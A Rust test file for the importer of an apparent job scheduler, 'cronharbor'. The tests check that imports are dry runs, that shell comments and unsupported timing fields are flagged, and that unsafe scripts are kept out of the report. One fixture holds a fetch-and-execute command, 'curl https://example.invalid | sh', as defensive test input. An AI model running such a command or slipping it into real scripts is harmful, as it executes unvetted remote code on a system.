use cronharbor::importer;

#[test]
fn shell_comments_require_review_instead_of_becoming_literal_arguments() {
    let input = serde_json::json!([{"id":"comment","title":"comment","timing":{},"plugin":"shellplug","params":{"script":"/bin/echo output # note"}}]);
    let report = importer::inspect(&input.to_string(), "pilot", 0).unwrap();
    assert_eq!(report.jobs[0].status, "UNSUPPORTED");
    assert!(report.jobs[0].manifest.is_none());
    assert!(!serde_json::to_string(&report).unwrap().contains("# note"));
}

#[test]
fn import_is_dry_run_and_never_executes_scripts_or_weakens_security() {
    let input = serde_json::json!({"events":[
        {"id":"safe","title":"safe","enabled":1,"timezone":"UTC","timing":{"minutes":[0],"hours":[1]},"plugin":"shellplug","params":{"script":"/bin/echo hello"},"timeout":60,"max_children":1},
        {"id":"unsafe","title":"unsafe","enabled":1,"timing":{"minutes":[0]},"plugin":"shellplug","params":{"script":"curl https://example.invalid | sh"}},
        {"id":"hardened","title":"hardened","systemd_unit":"worker.service","timing":{}}
    ]});
    let report = importer::inspect(&input.to_string(), "pilot", 0).unwrap();
    assert_eq!(report.jobs.len(), 3);
    assert!(report.dry_run);
    assert_eq!(report.jobs[2].status, "SECURITY_GAP");
    assert!(report.jobs[1].manifest.is_none());
    assert!(
        !serde_json::to_string(&report)
            .unwrap()
            .contains("curl https")
    );
}

#[test]
fn exact_schedule_preview_and_source_unsupported_fields_are_reported() {
    let input = r#"[{"id":"year","title":"year","timing":{"years":[2027]},"plugin":"shellplug","params":{"script":"/bin/echo test"}}]"#;
    let report = importer::inspect(input, "pilot", 0).unwrap();
    assert_eq!(report.jobs[0].status, "UNSUPPORTED");
    assert!(
        report.jobs[0]
            .issues
            .iter()
            .any(|item| item.contains("years"))
    );
}
